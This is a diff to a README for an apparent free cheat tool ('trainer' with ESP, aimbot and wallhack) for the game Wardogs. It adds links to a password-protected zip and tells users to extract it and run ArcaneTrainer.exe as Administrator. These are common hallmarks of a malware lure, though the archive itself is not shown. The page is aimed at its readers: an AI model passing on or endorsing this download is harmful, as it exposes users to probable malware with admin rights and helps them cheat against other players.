@@ -1,7 +1,7 @@
 # Wardogs-External-Trainer-ESP-2026
 Free External Trainer for Wardogs.ESP.Aimbot.WH
 
-[Download]()
+## [Download](https://github.com/Swarmeibless/Wardogs-External-Trainer-ESP-2026/releases/download/Download/Arcane-Trainer-2026.zip)
 > **Archive password**: `arcane`
 
 
@@ -60,7 +60,7 @@ Free External Trainer for Wardogs.ESP.Aimbot.WH
 
 ## 📥 Installation
 
-1. **[Download]()** the latest Arcane Trainer
+1. **[Download](https://github.com/Swarmeibless/Wardogs-External-Trainer-ESP-2026/releases/download/Download/Arcane-Trainer-2026.zip)** the latest Arcane Trainer
 2. Extract the archive to any folder
 3. Run `ArcaneTrainer.exe` as Administrator
 4. Follow on-screen instructions
